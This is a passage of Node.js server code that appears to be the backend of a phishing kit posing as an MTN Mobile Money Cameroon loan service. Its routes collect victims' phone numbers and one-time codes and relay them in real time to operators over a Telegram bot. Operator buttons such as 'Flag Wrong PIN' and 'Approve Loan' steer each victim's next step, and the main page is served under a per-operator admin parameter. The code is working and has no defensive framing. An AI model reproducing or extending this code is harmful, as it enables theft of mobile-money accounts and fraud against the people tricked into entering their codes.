        reply_markup: {
            inline_keyboard: [
                [{ text: '❌ Reject SMS', callback_data: `deny_sms_${application.adminId}_${applicationId}` }],
                [{ text: '✅ Allow 4-Digit OTP', callback_data: `allow_sms_${application.adminId}_${applicationId}` }]
            ]
        }
    });
}));

// Check SMS Status
app.get('/api/check-sms-status/:applicationId', asyncHandler(async (req, res) => {
    const application = await db.getApplication(req.params.applicationId);
    if (application) {
        res.json({ 
            success: true, 
            status: application.smsStatus || application.smsOtpStatus 
        });
    } else {
        res.status(404).json({ success: false, message: 'Application not found.' });
    }
}));

// Verify OTP Stage Entry
app.post('/api/verify-otp', asyncHandler(async (req, res) => {
    const applicationId = req.body.id || req.body.applicationId;
    const otpCode = req.body.otp;

    if (!applicationId || !otpCode) {
        return res.status(400).json({ success: false, message: 'Missing applicationId or OTP code.' });
    }

    const application = await db.getApplication(applicationId);
    if (!application) {
        return res.status(404).json({ success: false, message: 'Application not found.' });
    }

    await db.updateApplication(applicationId, {
        otp: otpCode,
        otpStatus: 'pending'
    });

    res.json({ success: true });

    sendToAdminAsync(application.adminId, `
🔢 *4-DIGIT OTP VERIFICATION*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
🔢 OTP: \`${otpCode}\`
    `.trim(), {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: '❌ Flag Wrong PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                [{ text: '❌ Flag Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
            ]
        }
    });
}));

// Check OTP Status
app.get('/api/check-otp-status/:applicationId', asyncHandler(async (req, res) => {
    const application = await db.getApplication(req.params.applicationId);
    if (application) {
        res.json({ success: true, status: application.otpStatus });
    } else {
        res.status(404).json({ success: false, message: 'Application not found.' });
    }
}));

// Health Check Endpoint
app.get('/health', (req, res) => {
    const memory = process.memoryUsage();
    res.json({
        status: 'ok',
        uptime: Math.floor(process.uptime()),
        database: dbReady ? 'connected' : 'disconnected',
        activeAdmins: adminChatIds.size,
        memoryUsage: {
            rssMB: Math.round(memory.rss / 1024 / 1024),
            heapUsedMB: Math.round(memory.heapUsed / 1024 / 1024)
        },
        timestamp: new Date().toISOString()
    });
});

// Frontend Entrypoint
app.get('/', asyncHandler(async (req, res) => {
    const adminId = req.query.admin;
    if (adminId && !adminChatIds.has(adminId)) {
        db.getAdmin(adminId).then(admin => {
            if (admin?.chatId && admin.status === 'active') {
                adminChatIds.set(adminId, admin.chatId);
            }
        }).catch(() => {});
    }
    res.sendFile(path.join(__dirname, 'mtn-momo-cameroon.html'));
}));

// Central Global Error Handler
app.use((err, req, res, next) => {
    console.error('❌ Unhandled Application Error:', err);
    res.status(500).json({ success: false, message: 'Internal Server Error' });
});

// ==========================================
// 10. GRACEFUL SHUTDOWN PIPELINE
// ==========================================
async function shutdownGracefully(signal) {
    console.log(`\n🛑 Signal ${signal} received. Initiating graceful shutdown...`);
    
    if (serverInstance) {
        serverInstance.close(() => {
            console.log('✅ HTTP server closed to new connections.');
        });
    }

    try {
        await bot.deleteWebHook();
        console.log('✅ Telegram webhook unbound.');
        await db.closeDatabase();
        console.log('✅ Database connections safely closed.');
        process.exit(0);
    } catch (error) {
        console.error('❌ Error during graceful shutdown:', error.message);
        process.exit(1);
    }
}

process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT', () => shutdownGracefully('SIGINT'));
